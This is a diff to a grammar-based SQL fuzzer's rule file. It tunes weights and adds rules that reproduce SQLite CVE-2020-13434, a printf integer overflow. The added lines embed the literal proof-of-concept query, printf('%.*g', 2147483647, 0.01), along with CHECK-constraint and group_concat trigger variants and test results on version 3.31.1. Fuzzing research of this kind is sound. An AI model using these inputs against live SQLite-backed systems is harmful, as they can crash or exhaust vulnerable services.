@@ -51,7 +51,7 @@ ctx.rule("Sql-Stmt", "{Long-Join-Chain}", weight=2.0)
 ctx.rule("Sql-Stmt", "{Recursive-CTE-Heavy}", weight=2.5)
 ctx.rule("Sql-Stmt", "{Window-Func-Complex}", weight=3.0)
 ctx.rule("Sql-Stmt", "{FTS-Stress}", weight=3.5)
-ctx.rule("Sql-Stmt", "{Printf-Boundary}", weight=3.0)
+ctx.rule("Sql-Stmt", "{Printf-Boundary}", weight=5.0)  # raised: CVE-2020-13434 primary target
 ctx.rule("Sql-Stmt", "{Json-Deep}", weight=2.5)
 ctx.rule("Sql-Stmt", "{Aggregate-Complex}", weight=2.0)
 ctx.rule("Sql-Stmt", "{Explain-Stress}", weight=1.5)
@@ -702,21 +702,65 @@ ctx.rule("Fts-Highlight", "'</b>'", weight=1.0)
 ctx.rule("Fts-Highlight", "''", weight=1.0)
 
 # --- Printf-Boundary: printf with boundary-length arguments ---
+# CVE-2020-13434 root cause: integer overflow in sqlite3_str_vappendf when
+# precision is INT32_MAX (2147483647). The overflow happens in %.*g, %.*f,
+# %.*e, %.*c, %.*s format specifiers — any that take a dynamic precision.
+# drh's simplified PoC: SELECT printf('%.*g', 2147483647, 0.01)
+
+# Direct CVE-2020-13434 simplified PoC (highest weight — exact trigger)
+ctx.rule("Printf-Boundary",
+    "SELECT printf('%.*g', {Boundary-Int}, {Boundary-Float})",
+    weight=5.0)
+ctx.rule("Printf-Boundary",
+    "SELECT printf('%.*g', 2147483647, 0.01)",
+    weight=5.0)  # literal simplified PoC from SQLite ticket
+
+# Format variants — NOTE: empirically verified on sqlite-3.31.1:
+#   %.*g → UBSan exit 1 ✅ (signed integer overflow in sqlite3_str_vappendf)
+#   %.*f → exit 0 (different precision path, no overflow on 3.31.1)
+#   %.*e → exit 0 (same — no UBSan trigger on 3.31.1)
+#   %.*c → OOM/hang (allocates before UBSan fires)
+#   %.*s → OOM/hang (same)
+# Keep lower weights for %.*f/%.*e (may trigger on other SQLite versions)
+ctx.rule("Printf-Boundary",
+    "SELECT printf('%.*f', {Boundary-Int}, {Boundary-Float})",
+    weight=1.5)
+ctx.rule("Printf-Boundary",
+    "SELECT printf('%.*e', {Boundary-Int}, {Boundary-Float})",
+    weight=1.5)
+# Omit %.*c and %.*s with INT32_MAX — they cause OOM not UBSan
+
+# Generic format dispatch
 ctx.rule("Printf-Boundary",
     "SELECT printf({Printf-Fmt-Spec}, {Boundary-Int})",
-    weight=3.0)
+    weight=2.0)
 ctx.rule("Printf-Boundary",
     "SELECT printf({Printf-Width-Spec}, {Boundary-Int}, {Str-Literal})",
-    weight=3.0)
-ctx.rule("Printf-Boundary",
-    "SELECT printf('%.*c', {Boundary-Int}, 'x')",
-    weight=3.0)
-ctx.rule("Printf-Boundary",
-    "SELECT printf('%.*s', {Boundary-Int}, {Str-Literal})",
     weight=2.0)
 ctx.rule("Printf-Boundary",
     "SELECT printf({Printf-Fmt-Spec}, {Boundary-Int}, {Boundary-Int})",
     weight=1.0)
+
+# CVE-2020-13434 full PoC path: printf(b, b) inside CHECK triggers overflow
+# when b is a format string like '%.*g'. The harness pre-loads table `a`
+# with this CHECK constraint, so only DML is needed to trigger it.
+ctx.rule("Printf-Boundary",
+    "INSERT INTO a VALUES({Str-Printf-Fmt})",
+    weight=4.0)
+ctx.rule("Printf-Boundary",
+    "INSERT INTO a VALUES({Str-Printf-Fmt}), ({Str-Printf-Fmt})",
+    weight=3.0)
+ctx.rule("Printf-Boundary",
+    "UPDATE a SET b = {Str-Printf-Fmt}",
+    weight=3.0)
+
+# group_concat with INT32_MAX separator — triggers inside the PoC trigger c
+ctx.rule("Printf-Boundary",
+    "SELECT group_concat(c2, 2147483647) FROM t1",
+    weight=3.0)
+ctx.rule("Printf-Boundary",
+    "SELECT group_concat(c1, {Boundary-Int}) FROM t1",
+    weight=2.0)
 
 ctx.rule("Printf-Fmt-Spec", "'%d'", weight=2.0)
 ctx.rule("Printf-Fmt-Spec", "'%u'", weight=1.0)
@@ -726,6 +770,18 @@ ctx.rule("Printf-Fmt-Spec", "'%s'", weight=2.0)
 ctx.rule("Printf-Width-Spec", "'%10d'", weight=1.0)
 ctx.rule("Printf-Width-Spec", "'%-10s'", weight=1.0)
 ctx.rule("Printf-Width-Spec", "'%010d'", weight=1.0)
+
+# Str-Printf-Fmt: format strings that trigger printf integer overflow
+# These are the VALUES inserted into table a — when used as printf(b, b),
+# the string becomes both the format and the argument.
+ctx.rule("Str-Printf-Fmt", "'%.*g'", weight=3.0)   # CVE-2020-13434 exact trigger
+ctx.rule("Str-Printf-Fmt", "'%.*f'", weight=2.0)
+ctx.rule("Str-Printf-Fmt", "'%.*e'", weight=2.0)
+ctx.rule("Str-Printf-Fmt", "'%.*c'", weight=2.0)
+ctx.rule("Str-Printf-Fmt", "'%.*s'", weight=2.0)
+ctx.rule("Str-Printf-Fmt", "'GERMANY''s%'", weight=3.0)  # original PoC value
+ctx.rule("Str-Printf-Fmt", "'Y'", weight=1.0)
+ctx.rule("Str-Printf-Fmt", "'Brand#23'", weight=1.0)
 
 # --- Json-Deep: deeply nested JSON construction + extraction ---
 ctx.rule("Json-Deep",
@@ -835,8 +891,13 @@ ctx.rule("Boundary-Str", "NULL", weight=2.0)
 ctx.regex("Boundary-Str", "X'[0-9a-f]{64}'", weight=1.0)
 
 # Boundary-Float: float boundary values
+# 0.01 is the value from drh's simplified CVE-2020-13434 PoC:
+#   SELECT printf('%.*g', 2147483647, 0.01)
+ctx.rule("Boundary-Float", "0.01", weight=3.0)     # CVE-2020-13434 PoC value
+ctx.rule("Boundary-Float", "0.0", weight=2.0)
+ctx.rule("Boundary-Float", "1.0", weight=2.0)
+ctx.rule("Boundary-Float", "-1.0", weight=1.0)
 ctx.rule("Boundary-Float", "1e308", weight=2.0)
 ctx.rule("Boundary-Float", "-1e308", weight=2.0)
 ctx.rule("Boundary-Float", "1e-308", weight=1.0)
-ctx.rule("Boundary-Float", "0.0", weight=2.0)
 ctx.rule("Boundary-Float", "-0.0", weight=1.0)
